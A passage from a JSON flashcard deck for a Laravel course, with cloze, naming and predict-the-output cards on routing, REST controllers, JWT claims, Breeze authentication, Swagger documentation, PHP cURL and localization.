destroy","explanation":"Each name maps to a specific HTTP verb and URL pattern. index = GET /resource; store = POST /resource; show = GET /resource/{id}; update = PUT /resource/{id}; destroy = DELETE /resource/{id}. Memorise the names exactly — Laravel's scaffolding, Sanctum, and form requests all assume this convention.\n","example":"```php\n// Generated stub from: php artisan make:controller api/StudentsController --api\npublic function index()   { /* GET /api/students */ }\npublic function store()   { /* POST /api/students */ }\npublic function show()    { /* GET /api/students/{id} */ }\npublic function update()  { /* PUT /api/students/{id} */ }\npublic function destroy() { /* DELETE /api/students/{id} */ }\n```\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"},{"id":"routing-card-04","type":"name","prompt":"You add -\u003emiddleware(['auth:sanctum']) to a resource route and deploy. Authenticated requests still reach the controller without a token. What is the most likely cause?\n","answer":"A stale route cache — run php artisan route:clear","explanation":"php artisan route:cache compiles all routes to a single PHP file. Until you clear that file with php artisan route:clear, Laravel serves the cached route table regardless of changes to route files. The middleware addition is correct but invisible until the cache is invalidated.\n","example":"```bash\n# After any routing or middleware change:\nphp artisan route:clear\n# Optional: rebuild cache for production\nphp artisan route:cache\n```\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"apply"},{"id":"routing-card-05","type":"cloze","prompt":"API routes live in {{routes/api.php}} and are automatically prefixed with {{/api/}}. Web routes live in {{routes/web.php}} and apply session state and CSRF protection.\n","answer":"routes/api.php; /api/; routes/web.php","explanation":"Laravel splits routing into two files by middleware group. The api group (routes/api.php) is stateless and rate-limited; every URI is reachable at /api/{uri}. The web group (routes/web.php) uses sessions and cookies. Putting a REST endpoint in web.php will break stateless clients that do not send a CSRF token.\n","example":"```php\n// routes/api.php\n// Accessible at: http://localhost:8888/api/students\nRoute::apiResource('students', StudentsController::class);\n```\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"id":"routing-card-06","type":"predict","lang":"php","prompt":"You run: Route::apiResource('students', StudentsController::class) -\u003eonly(['index', 'store']); A client sends DELETE /api/students/5. What does Laravel return?\n","code":"// routes/api.php\nRoute::apiResource('students', StudentsController::class)\n    -\u003eonly(['index', 'store']);\n\n// Client request:\n// DELETE /api/students/5\n","answer":"404 Not Found — the destroy route was not registered by -\u003eonly(['index', 'store'])","explanation":"-\u003eonly() whitelists exactly the named controller methods. Any HTTP verb or URL that does not match a registered route returns 404. This is intentional: it prevents accidental exposure of endpoints that have no controller logic.\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"apply"},{"id":"routing-card-07","type":"name","prompt":"What Artisan command scaffolds a resource controller bound to a model, omitting the create and edit method stubs?\n","answer":"php artisan make:controller api/StudentsController --api --model=Student","explanation":"--api tells Artisan to generate only the 5 API method stubs (no create/edit). --model=Student binds route model injection so Laravel automatically resolves the Student model from the {student} route parameter.\n","example":"```bash\nphp artisan make:controller api/StudentsController --api --model=Student\n# Generates: app/Http/Controllers/api/StudentsController.php\n# with stubs: index, store, show, update, destroy\n```\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"apply"}]}]},{"id":"api-and-auth","name":"API and Authentication","topics":[{"id":"rest-api-design","name":"REST API design in Laravel","tags":["rest","api","json","http-methods","laravel","resource-controller"],"prose":"Laravel's resource controller maps HTTP verbs to controller methods through Route::resource(). A working API requires route registration, validation, $fillable on the model, proper JSON responses, and 404 handling.","source":"laravel_with_sqlite_API_SCRIPT.docx","cards":[{"id":"rest-api-card-01","type":"cloze","prompt":"To register all five RESTful routes for a StudentsController, add {{Route::resource('students', StudentsController::class)}} to routes/api.php.","answer":"Route::resource('students', StudentsController::class)","explanation":"Route::resource() maps GET, POST, PUT, and DELETE verbs to index, store, show, update, and destroy methods in one declaration, eliminating five separate Route:: calls.","example":"// Replaces five individual routes with one line:\nRoute::resource('students', StudentsController::class);\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"},{"id":"rest-api-card-02","type":"name","prompt":"Which HTTP status code should store() return when a new resource is successfully created, and how do you set it with response()-\u003ejson()?","answer":"201 — pass it as the second argument: response()-\u003ejson($data, 201)","explanation":"201 Created signals that a new resource was created (not merely retrieved). Returning 200 on a POST is technically incorrect and misleads API consumers who inspect status codes.","example":"return response()-\u003ejson($student, 201); // not response()-\u003ejson($student);","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"id":"rest-api-card-03","type":"cloze","prompt":"Without a {{$fillable}} array on an Eloquent model, calling Student::create([...]) throws a MassAssignmentException.","answer":"$fillable","explanation":"$fillable is a whitelist of attributes that may be set via mass assignment (create() or fill()). Laravel blocks all other attributes to prevent accidental or malicious data injection.","example":"protected $fillable = ['FirstName', 'LastName', 'School'];\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"id":"rest-api-card-04","type":"name","prompt":"What does findOrFail($id) return when the record does not exist in the database?","answer":"It throws a ModelNotFoundException, which Laravel converts to a 404 response.","explanation":"findOrFail() eliminates the manual if (!$model) check. The thrown ModelNotFoundException is caught by Laravel's exception handler and converted to an HTTP 404 response automatically.","example":"$student = Student::findOrFail($id); // 404 if missing — no if-check needed\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"id":"rest-api-card-05","type":"predict","lang":"php","prompt":"This store() method is called with a POST body missing the 'School' field. What HTTP status code does Laravel return?","code":"public function store(Request $request)\n{\n    $request-\u003evalidate([\n        'FirstName' =\u003e 'required',\n        'LastName'  =\u003e 'required',\n        'School'    =\u003e 'required',\n    ]);\n    $student = Student::create([...]);\n    return response()-\u003ejson($student, 201);\n}\n","answer":"422 Unprocessable Entity — validate() halts execution and Laravel returns a JSON error body listing the failed 'School' rule.","explanation":"$request-\u003evalidate() throws a ValidationException when any rule fails. Laravel's exception handler converts it to a 422 response with a structured JSON body — no additional code is required in the controller.","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"apply"},{"id":"rest-api-card-06","type":"name","prompt":"Where in a Laravel project is CORS configured, and what does the default wildcard value allow?","answer":"config/cors.php — the default allowed_origins ['*'] permits requests from any origin for all HTTP methods.","explanation":"Laravel includes HandleCors middleware by default. The wildcard is fine for development but should be narrowed to specific domains in production. After changing config/cors.php, run php artisan config:clear to invalidate the cache.","example":"// config/cors.php\n'allowed_origins' =\u003e ['*'],  // allow any origin\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"id":"rest-api-card-07","type":"cloze","prompt":"The Artisan command to create an API resource controller for the Student model is: php artisan {{make:controller api/StudentsController --api --model=Student}}.","answer":"make:controller api/StudentsController --api --model=Student","explanation":"--api omits create() and edit() (which render HTML forms, not useful in a JSON API). --model=Student injects route-model binding into the scaffolded methods automatically.","example":"php artisan make:controller api/StudentsController --api --model=Student\n# Creates: app/Http/Controllers/api/StudentsController.php\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"}]},{"id":"jwt-authentication","name":"JWT Authentication","tags":["jwt","authentication","bearer-token","laravel","api"],"prose":"JWT (JSON Web Token) is a stateless authentication mechanism. The server signs a token on login; every request carries that token; the server re-verifies the signature. No session table required.","source":"PHP_JWT.pptx; laravel-jwt_SCRIPT.docx","cards":[{"id":"jwt-auth-card-01","type":"cloze","prompt":"A JWT token has three dot-separated sections: {{header}}.{{payload}}.{{signature}}, all base64-encoded.","answer":"header, payload, signature","explanation":"The header declares the algorithm (e.g. HS256). The payload holds claims (user data + metadata). The signature is a hash of header + payload using the server's secret — it proves the token was not tampered with.","example":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsImlhdCI6MTcxNjIzOTAyMn0.SflKxwRJSMeKKF2Q","source":"PHP_JWT.pptx slide 9","bloom":"remember"},{"id":"jwt-auth-card-02","type":"name","prompt":"Which part of a JWT token proves the payload has not been modified after issuance?","answer":"The signature","explanation":"The server computes the signature by hashing base64(header) + '.' + base64(payload) with its secret key. On each request it recomputes the hash — any payload change breaks the match and the request is rejected.","source":"PHP_JWT.pptx slide 5","bloom":"understand"},{"id":"jwt-auth-card-03","type":"cloze","prompt":"The JWT reserved claim {{iat}} records the Unix timestamp when the token was issued.","answer":"iat","explanation":"'Issued At' — a required baseline for validating nbf and exp. All time-based claims are relative to or compared against iat.","source":"PHP_JWT.pptx slide 8","bloom":"remember"},{"id":"jwt-auth-card-04","type":"cloze","prompt":"The JWT reserved claim {{iss}} identifies which application produced the token and can be used to reject tokens from other apps.","answer":"iss","explanation":"'Issuer' — typically set to a domain name or app identifier. A server can check this field to refuse tokens minted by a different service.","example":"\"iss\": \"your-app.com\"","source":"PHP_JWT.pptx slide 8","bloom":"understand"},{"id":"jwt-auth-card-05","type":"cloze","prompt":"The JWT reserved claim {{nbf}} sets the earliest timestamp at which the token is considered valid; it must be \u003e= iat.","answer":"nbf","explanation":"'Not Before' — allows issuing a token that is not yet valid (e.g. starts 10 seconds after creation). Requests arriving before this timestamp are rejected even if the signature is valid.","source":"PHP_JWT.pptx slide 8","bloom":"understand"},{"id":"jwt-auth-card-06","type":"cloze","prompt":"The JWT reserved claim {{exp}} is the Unix timestamp after which the token is no longer accepted; it must be greater than both iat and nbf.","answer":"exp","explanation":"'Expiration Time' — the primary expiry guard. If the current time exceeds exp, the server returns 401 regardless of signature validity.","example":"\"exp\": 1716242622  // iat + 3600 = expires in 1 hour","source":"PHP_JWT.pptx slide 8","bloom":"remember"},{"id":"jwt-auth-card-07","type":"cloze","prompt":"The JWT reserved claim {{sub}} identifies the principal the token is about — in Laravel JWT it stores the user's primary key.","answer":"sub","explanation":"'Subject' — getJWTIdentifier() on the User model returns $this-\u003egetKey(), which becomes the sub claim value. The server uses sub to look up the user on protected requests.","source":"PHP_JWT.pptx slide 9; laravel-jwt_SCRIPT.docx","bloom":"understand"},{"id":"jwt-auth-card-08","type":"name","prompt":"Which JWT reserved claim identifies the intended recipient(s) of the token, allowing a server to reject tokens not addressed to it?","answer":"aud (audience)","explanation":"'Audience' — prevents a valid token issued for app-A from being accepted by app-B. The server checks that its own identifier appears in the aud claim.","source":"PHP_JWT.pptx slide 9","bloom":"understand"},{"id":"jwt-auth-card-09","type":"name","prompt":"Which JWT reserved claim provides a unique identifier for each individual token, used to prevent replay attacks?","answer":"jti (JWT ID)","explanation":"'JWT ID' — a UUID or similar unique string. By storing seen jti values, a server can reject a token that has already been used, even if it is still within its expiry window.","source":"PHP_JWT.pptx slide 9","bloom":"analyze"},{"id":"jwt-auth-card-10","type":"cloze","prompt":"The JWT Composer package used in this course is {{php-open-source-saver/jwt-auth}}, NOT tymon/jwt-auth.","answer":"php-open-source-saver/jwt-auth","explanation":"These are two different packages with different namespaces and different setup steps. Using tymon/jwt-auth is the most common setup mistake. The service provider for the correct package is PHPOpenSourceSaver\\JWTAuth\\Providers\\LaravelServiceProvider.","source":"laravel-jwt_SCRIPT.docx","bloom":"remember"},{"id":"jwt-auth-card-11","type":"cloze","prompt":"After login, the client sends the JWT on every protected request using the header: {{Authorization}}: {{Bearer}} \u003ctoken\u003e.","answer":"Authorization, Bearer","explanation":"The auth:api middleware reads this header, strips the 'Bearer ' prefix, and validates the token signature and expiry. No cookie. No session. The token is the only credential.","example":"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","source":"laravel-jwt_SCRIPT.docx","bloom":"remember"},{"id":"jwt-auth-card-12","type":"name","prompt":"Name the two methods the User model must implement when it implements the JWTSubject interface.","answer":"getJWTIdentifier() and getJWTCustomClaims()","explanation":"getJWTIdentifier() returns the value stored in the 'sub' claim (typically $this-\u003egetKey()). getJWTCustomClaims() returns an array of any extra payload fields — returning [] is valid for basic auth.","source":"laravel-jwt_SCRIPT.docx","bloom":"remember"},{"id":"jwt-auth-card-13","type":"predict","lang":"php","prompt":"What does Auth::attempt($credentials) return on a successful login in a JWT-configured app?","code":"$credentials = $request-\u003eonly('email', 'password');\n$result = Auth::attempt($credentials);\n// What is $result on success?\n","answer":"The JWT token string (not just true). On failure it returns false.","explanation":"In a JWT-guarded app, Auth::attempt() returns the signed token string directly when credentials are valid. This differs from session-based auth where attempt() returns a boolean. The token is then returned to the client in the JSON response.","source":"laravel-jwt_SCRIPT.docx","bloom":"apply"},{"id":"jwt-auth-card-14","type":"cloze","prompt":"After installing php-open-source-saver/jwt-auth, run {{php artisan jwt:secret}} to generate the signing key written to .env.","answer":"php artisan jwt:secret","explanation":"This writes JWT_SECRET=... to .env. The secret is used to sign and verify every token. Without it the package cannot produce valid signatures.","source":"laravel-jwt_SCRIPT.docx","bloom":"remember"},{"id":"jwt-auth-card-15","type":"name","prompt":"In config/auth.php, what driver value must you set for the 'api' guard to enable JWT authentication?","answer":"'driver' =\u003e 'jwt'","explanation":"Without this, the auth:api middleware does not know to use JWT. It would fall back to session or token-based auth and reject all Bearer token requests. The 'provider' must also be set to 'users'.","example":"'api' =\u003e [\n    'driver'   =\u003e 'jwt',\n    'provider' =\u003e 'users',\n],\n","source":"laravel-jwt_SCRIPT.docx","bloom":"apply"}]},{"id":"session-auth-breeze","name":"Session Authentication with Breeze","tags":["authentication","session","breeze","laravel","tailwind"],"prose":"Laravel Breeze scaffolds a complete session-auth system in two commands. It uses Tailwind CSS for views and wires register/login/logout/password-reset flow. Protect routes with -\u003emiddleware(['auth']).","source":"auth-with-breeze_SQLite_SCRIPT.docx","cards":[{"id":"session-auth-card-01","type":"cloze","prompt":"Install Breeze with: `{{composer require laravel/breeze --dev}}` followed by `{{php artisan breeze:install}}`.","answer":"composer require laravel/breeze --dev; php artisan breeze:install","explanation":"The first command pulls the package as a dev dependency; the second publishes routes, controllers, and Blade views into your project. Both steps are required — the package alone does nothing until the installer runs.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"remember"},{"id":"session-auth-card-02","type":"name","prompt":"Which CSS framework does Laravel Breeze use for its scaffolded views?","answer":"Tailwind CSS","explanation":"Breeze is built on Tailwind CSS. The older laravel/ui package uses Bootstrap instead. This distinction is explicitly tested — do not substitute one for the other.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"remember"},{"id":"session-auth-card-03","type":"name","prompt":"Name the Auth facade call that returns the full authenticated User model.","answer":"Auth::user()","explanation":"Auth::user() returns the authenticated User Eloquent model (or null if unauthenticated). Auth::id() returns only the primary key integer. Use the facade form, not auth()-\u003euser().","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"understand"},{"id":"session-auth-card-04","type":"cloze","prompt":"To restrict all routes in a group to logged-in users, write: `Route::middleware({{'auth'}})-\u003egroup(function () { ... });`","answer":"'auth'","explanation":"The 'auth' middleware checks for a valid session and redirects unauthenticated visitors to /login. Chaining it on a route group applies protection to every route inside.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"apply"},{"id":"session-auth-card-05","type":"name","prompt":"What does the 'verified' middleware require beyond what 'auth' already checks?","answer":"The user's email address must be verified","explanation":"'auth' only requires a valid session. 'verified' additionally checks that the user has clicked the email verification link. A logged-in but unverified user is redirected to /verify-email.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"understand"},{"id":"session-auth-card-06","type":"cloze","prompt":"Breeze stores all auth routes in `{{routes/auth.php}}`, which is included from `routes/web.php` via `require __DIR__.'/auth.php'`.","answer":"routes/auth.php","explanation":"Breeze separates auth routes from application routes to keep web.php clean. The require statement at the bottom of web.php loads all register/login/logout/password-reset/verify-email routes.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"remember"},{"id":"session-auth-card-07","type":"name","prompt":"Which first-party Laravel package provides token authentication as an alternative to Breeze's session-based auth?","answer":"Sanctum","explanation":"Sanctum issues personal access tokens stored in the database (via createToken()). Breeze manages server-side sessions with cookies. Both are first-party Laravel packages; Sanctum is the token-based alternative for SPA and mobile API clients.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"understand"},{"id":"session-auth-card-08","type":"predict","lang":"php","prompt":"What does Auth::id() return when called inside a controller method protected by the 'auth' middleware?","code":"Route::middleware('auth')-\u003egroup(function () {\n    Route::get('/orgs', [OrgController::class, 'index']);\n});\n\n// Inside OrgController::index():\nreturn Auth::id();\n","answer":"The authenticated user's integer primary key (e.g. 1, 2, 3). It is guaranteed non-null here because the 'auth' middleware blocks unauthenticated requests before they reach the controller.","explanation":"Auth::id() returns null for unauthenticated requests. Because the route has 'auth' middleware, only authenticated requests arrive at the controller — so the return value is always an integer in this context.","source":"auth-with-breeze_SQLite_SCRIPT.docx","bloom":"apply"}]}]},{"id":"swagger-and-curl","name":"Swagger/OpenAPI and cURL","topics":[{"id":"swagger-openapi","name":"OpenAPI and Swagger Documentation","tags":["swagger","openapi","l5-swagger","laravel","api-docs"],"prose":"OpenAPI is the specification language (YAML/JSON contract); Swagger is the toolset that reads it (UI, Editor, Codegen). The l5-swagger package brings Swagger tools into Laravel via @OA\\ annotations on controllers.","source":"swagger-with-laravel.pptx; Laravel_L5Swagger_SCRIPT_2026.docx","cards":[{"id":"swagger-card-01","type":"name","prompt":"What is the difference between OpenAPI and Swagger?","answer":"OpenAPI is the specification language (YAML/JSON contract). Swagger is the toolset (UI, Editor, Codegen) that reads that spec.","explanation":"This distinction is consistently tested. Using 'Swagger' to mean the spec is incorrect. The spec language is OpenAPI; the interactive browser docs are Swagger UI.","example":"`php artisan l5-swagger:generate` produces an OpenAPI JSON file. Swagger UI reads that file and renders the /api/documentation page.","source":"swagger-with-laravel.pptx slide 2","bloom":"remember"},{"id":"swagger-card-02","type":"cloze","prompt":"The Composer package that integrates Swagger tools into Laravel is {{darkaonline/l5-swagger}}.","answer":"darkaonline/l5-swagger","explanation":"This is the canonical package name used in this course. It is also referred to as l5-swagger. The install command is `composer require darkaonline/l5-swagger -W`.","example":"composer require darkaonline/l5-swagger -W","source":"swagger-with-laravel.pptx slide 4; Laravel_L5Swagger_SCRIPT_2026.docx Step 1","bloom":"remember"},{"id":"swagger-card-03","type":"cloze","prompt":"The two required fields in an `@OA\\Info` annotation are {{title}} and {{version}}.","answer":"title, version","explanation":"Without both fields, l5-swagger generates an invalid OpenAPI document. The `description` and `contact` fields are optional. `@OA\\\\Info` belongs on the abstract base Controller class.","example":"#[OA\\Info(title: \"My API\", version: \"1.0.0\")]","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 3","bloom":"remember"},{"id":"swagger-card-04","type":"cloze","prompt":"After adding or changing `@OA\\ annotations`, regenerate the documentation with {{php artisan l5-swagger:generate}}.","answer":"php artisan l5-swagger:generate","explanation":"This command compiles all annotations in the project into a single OpenAPI JSON document. Swagger UI reads that document. Without regenerating, the UI shows stale docs.","example":"Add #[OA\\Get(...)] above index(), then run `php artisan l5-swagger:generate`, then refresh /api/documentation.","source":"swagger-with-laravel.pptx slide 7; Laravel_L5Swagger_SCRIPT_2026.docx Step 6","bloom":"remember"},{"id":"swagger-card-05","type":"name","prompt":"What URL does Swagger UI serve by default after installing l5-swagger?","answer":"/api/documentation","explanation":"The l5-swagger package auto-registers this route when installed. Visiting it after generating docs shows the interactive Swagger UI page.","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 7","bloom":"remember"},{"id":"swagger-card-06","type":"name","prompt":"What does `@OA\\Response` specify inside an endpoint annotation?","answer":"A single HTTP response — its status code, description, and optionally the shape of the returned JSON.","explanation":"`@OA\\Response` is nested inside `@OA\\Get`, `@OA\\Post`, etc. You declare one per expected status code (200, 201, 404, 422). The `content` field links to a schema for the body shape.","example":"new OA\\Response(response: 200, description: \"List of all students\", content: new OA\\JsonContent(...))","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 5","bloom":"understand"},{"id":"swagger-card-07","type":"predict","lang":"php","prompt":"This annotated method is added and `php artisan l5-swagger:generate` is run. What does Swagger UI show at /api/documentation for this endpoint?","code":"#[OA\\Get(\n    path: \"/api/students/{id}\",\n    tags: [\"Students\"],\n    summary: \"Get a student by ID\",\n    parameters: [\n        new OA\\Parameter(\n            name: \"id\", in: \"path\", required: true,\n            schema: new OA\\Schema(type: \"integer\")\n        )\n    ],\n    responses: [\n        new OA\\Response(response: 200, description: \"Student details\"),\n        new OA\\Response(response: 404, description: \"Student not found\")\n    ]\n)]\npublic function show(int $id): JsonResponse { ... }\n","answer":"Swagger UI shows a GET /api/students/{id} entry under the Students tag. It includes an integer input field for the `id` path parameter and documents two responses: 200 and 404. The Try it out button calls the live endpoint.","explanation":"Each `@OA\\Parameter` with `in: \"path\"` becomes an input field in Swagger UI. Each `@OA\\Response` becomes a row in the responses table. The tag groups the endpoint under a collapsible section.","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 5","bloom":"apply"},{"id":"swagger-card-08","type":"cloze","prompt":"To publish the l5-swagger config file into your project, run `php artisan vendor:publish --provider={{L5Swagger\\\\L5SwaggerServiceProvider}}`.","answer":"L5Swagger\\L5SwaggerServiceProvider","explanation":"This step copies config/l5-swagger.php into your project. Without it, Swagger UI serves a blank or broken page because there is no config to read.","example":"php artisan vendor:publish --provider=\"L5Swagger\\L5SwaggerServiceProvider\"","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 2","bloom":"remember"},{"id":"swagger-card-09","type":"name","prompt":"Where in a Laravel project does the `@OA\\Info` annotation belong, and why?","answer":"On the abstract base Controller class in app/Http/Controllers/Controller.php. It must appear exactly once and provides global API metadata (title, version) for the entire OpenAPI document.","explanation":"Placing it on the base class ensures one canonical location. l5-swagger scans the whole project for annotations; `@OA\\Info` appearing more than once or not at all causes generation errors.","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 3","bloom":"understand"},{"id":"swagger-card-10","type":"cloze","prompt":"To auto-regenerate Swagger docs on every request during development, set {{L5_SWAGGER_GENERATE_ALWAYS}}=true in your .env file.","answer":"L5_SWAGGER_GENERATE_ALWAYS","explanation":"This is convenient during development but should not be left on in production — regenerating on every request is expensive. Restart the dev server after changing this variable.","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 8","bloom":"understand"},{"id":"swagger-card-11","type":"name","prompt":"What annotation defines a reusable data model that can be referenced across multiple endpoint responses?","answer":"@OA\\Schema","explanation":"Defining a schema once and referencing it via `ref: \"#/components/schemas/Name\"` avoids repeating property lists in every `@OA\\Response`. Swagger UI renders schemas as expandable model panels.","example":"#[OA\\Schema(schema: \"Student\", properties: [new OA\\Property(property: \"id\", type: \"integer\")])]","source":"swagger-with-laravel.pptx slide 9; Laravel_L5Swagger_SCRIPT_2026.docx Step 4","bloom":"understand"},{"id":"swagger-card-12","type":"predict","lang":"php","prompt":"A developer adds a new `@OA\\Post` annotation to store() but does NOT run `php artisan l5-swagger:generate`. What does /api/documentation show?","code":"// New annotation added above store()\n#[OA\\Post(path: \"/api/students\", summary: \"Create student\", ...)]\npublic function store(Request $request) { ... }\n// Developer refreshes /api/documentation without regenerating\n","answer":"The old documentation. The POST /api/students endpoint does not appear. Swagger UI serves the previously generated OpenAPI JSON, which does not include the new annotation.","explanation":"l5-swagger does not watch for annotation changes automatically. The generate step is a required manual compile. Setting L5_SWAGGER_GENERATE_ALWAYS=true in .env is the only way to avoid this.","source":"Laravel_L5Swagger_SCRIPT_2026.docx Step 6; swagger-with-laravel.pptx slide 7","bloom":"apply"}]},{"id":"curl-http-client","name":"cURL HTTP Client","tags":["curl","http-client","laravel","api"],"prose":"PHP's cURL extension makes HTTP requests from server-side code. The five-step sequence curl_init → curl_setopt → curl_exec → curl_close → json_decode is the core pattern.","source":"cURL.pptx","cards":[{"id":"curl-card-01","type":"name","prompt":"What does `curl_init()` return?","answer":"A cURL handle","explanation":"The cURL handle is a PHP resource that identifies the session. Every subsequent curl_setopt(), curl_exec(), and curl_close() call requires it as the first argument.","example":"`$ch = curl_init();` — $ch is now the cURL handle for this session.","source":"cURL.pptx slide 4","bloom":"remember"},{"id":"curl-card-02","type":"cloze","prompt":"Setting `curl_setopt($ch, CURLOPT_RETURNTRANSFER, true)` causes `curl_exec()` to {{return the response as a string}} instead of {{printing it to the screen}}.","answer":"return the response as a string; printing it to the screen","explanation":"Without CURLOPT_RETURNTRANSFER set to true, curl_exec() outputs the response body directly to the browser and returns true. The variable you assign gets true, not the data — json_decode() then returns null.","source":"cURL.pptx slide 5","bloom":"understand"},{"id":"curl-card-03","type":"cloze","prompt":"The five-step cURL sequence is: {{curl_init()}} → {{curl_setopt()}} → {{curl_exec()}} → {{curl_close()}} → {{json_decode()}}.","answer":"curl_init(); curl_setopt(); curl_exec(); curl_close(); json_decode()","explanation":"Each step is mandatory for a complete REST API call. Skipping curl_close() leaks memory; skipping json_decode() leaves you with a raw JSON string rather than a usable PHP array.","source":"cURL.pptx slide 4","bloom":"remember"},{"id":"curl-card-04","type":"predict","lang":"php","prompt":"What is the value of `$response` after this code runs, and why?","code":"$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, 'https://api.example.com/students');\n// CURLOPT_RETURNTRANSFER is NOT set\n$response = curl_exec($ch);\ncurl_close($ch);\n","answer":"`$response` is `true` (boolean), not the response body. Without CURLOPT_RETURNTRANSFER, curl_exec() prints directly to screen and returns true on success.","explanation":"This is the most common cURL bug. The response appears on screen unintentionally, and json_decode(true, true) returns null — no error is thrown.","source":"cURL.pptx slide 5","bloom":"apply"},{"id":"curl-card-05","type":"name","prompt":"Which cURL option stores the HTTP response in a variable rather than printing it?","answer":"CURLOPT_RETURNTRANSFER","explanation":"Set it to true before calling curl_exec(). It is required for any API call where you need to process the response in PHP rather than display it directly.","source":"cURL.pptx slide 5","bloom":"remember"},{"id":"curl-card-06","type":"cloze","prompt":"To make a POST request with cURL, set `CURLOPT_POST` to `{{true}}` and provide the request body via `{{CURLOPT_POSTFIELDS}}`.","answer":"true; CURLOPT_POSTFIELDS","explanation":"CURLOPT_POST switches the HTTP method. CURLOPT_POSTFIELDS accepts the body — pass a JSON-encoded string for REST APIs and pair it with a Content-Type: application/json header via CURLOPT_HTTPHEADER.","source":"cURL.pptx slide 5","bloom":"understand"},{"id":"curl-card-07","type":"cloze","prompt":"`json_decode($response, true)` converts a JSON string into a PHP {{associative array}}. Omitting the second argument returns a {{stdClass object}} instead.","answer":"associative array; stdClass object","explanation":"The boolean true flag is the toggle for array vs object output. Most Laravel code expects associative arrays, so always pass true for REST API responses.","source":"cURL.pptx slide 5","bloom":"understand"}]}]},{"id":"localization-module","name":"Localization","topics":[{"id":"laravel-localization","name":"Laravel Localization","tags":["localization","laravel","i18n","locale"],"prose":"Laravel's localization system lets you serve translated text by locale. The __() helper retrieves translated strings; trans_choice() handles pluralization. PHP and JSON translation files serve different use cases.","source":"localization.pptx; laravel-localization.docx","cards":[{"id":"locale-card-01","type":"cloze","prompt":"The Laravel helper for retrieving a translated string is {{__()}} — not trans(), t(), i18n(), or translate().","answer":"__() (double underscore)","explanation":"`__()` is the canonical form. The exam (past-exam Q2) uses all four wrong variants as distractors. No other helper name is acceptable in an exam answer.","example":"`{{ __('messages.welcome') }}` in Blade; `__('Submit')` in a PHP file.","source":"localization.pptx slide 6; final-practice.docx Q2","bloom":"remember"},{"id":"locale-card-02","type":"cloze","prompt":"A locale is a string like {{`'en'`}}, `'fr'`, or `'de'` that identifies the language (and optionally region) for the active request.","answer":"'en' (or any valid locale string)","explanation":"The locale string is the lookup key Laravel uses to find the correct translation directory or JSON file. Setting it incorrectly causes all translations to fall back silently.","example":"`App::setLocale('fr')` sets the locale to French for the current request.","source":"localization.pptx slide 3","bloom":"remember"},{"id":"locale-card-03","type":"name","prompt":"A PHP file at `resources/lang/en/messages.php` that returns an associative array of translated strings is called what?","answer":"PHP translation file","explanation":"PHP translation files group named keys under a file namespace. `__('messages.welcome')` uses dot notation to look up `welcome` inside `messages.php` for the active locale.","example":"return ['welcome' =\u003e 'Welcome to our application'];","source":"localization.pptx slide 4","bloom":"remember"},{"id":"locale-card-04","type":"cloze","prompt":"JSON translation files live at `resources/lang/{{locale}}.json` and use the {{English phrase}} as the lookup key.","answer":"locale (e.g. 'fr'); English phrase","explanation":"Because the English phrase is the key, no dot notation is needed: `__('Submit')` resolves directly. This works for simple UI strings; PHP files are better for structured domain text.","example":"`resources/lang/fr.json`: `{ \"Submit\": \"Envoyer\" }` — retrieved with `__('Submit')` when locale is `'fr'`.","source":"localization.pptx slide 5","bloom":"understand"},{"id":"locale-card-05","type":"name","prompt":"Which Laravel helper handles pluralized translations using pipe-delimited rules?","answer":"trans_choice()","explanation":"`trans_choice()` evaluates rules like `'{0} No apples|{1} One apple|[2,*] :count apples'` against the count argument. `__()` cannot select between plural forms.","example":"`trans_choice('messages.apples', 3)` returns `'3 apples'`.","source":"localization.pptx slides 6–7","bloom":"understand"},{"id":"locale-card-06","type":"cloze","prompt":"The default locale is set in `{{config/app.php}}` under the key `'locale'`.","answer":"config/app.php","explanation":"This file is the single source for application-wide locale defaults. Runtime switching via `App::setLocale()` overrides it for the current request only — the config value is unchanged.","example":"`'locale' =\u003e env('APP_LOCALE', 'en')` in config/app.php sets English as the default.","source":"localization.pptx slide 8","bloom":"remember"},{"id":"locale-card-07","type":"name","prompt":"Which two `App` facade methods read and write the active locale at runtime?","answer":"App::setLocale() and App::getLocale()","explanation":"`App::setLocale('fr')` switches the locale for the current request. `App::getLocale()` returns the current value. Middleware typically calls `setLocale()` once per request based on session data.","example":"In middleware: `App::setLocale(Session::get('locale'))` — then every `__()` call uses French.","source":"localization.pptx slide 8","bloom":"remember"},{"id":"locale-card-08","type":"predict","lang":"php","prompt":"What does this code print for each call?","code":"// resources/lang/en/messages.php contains:\n// 'items' =\u003e '{0} No items|{1} One item|[2,*] :count items'\n\necho trans_choice('messages.items', 0) . \"\\n\";\necho trans_choice('messages.items', 1) . \"\\n\";\necho trans_choice('messages.items', 7) . \"\\n\";\n","answer":"No items\nOne item\n7 items","explanation":"Each call matches the first pipe-delimited rule that covers its count. `{0}` matches 0, 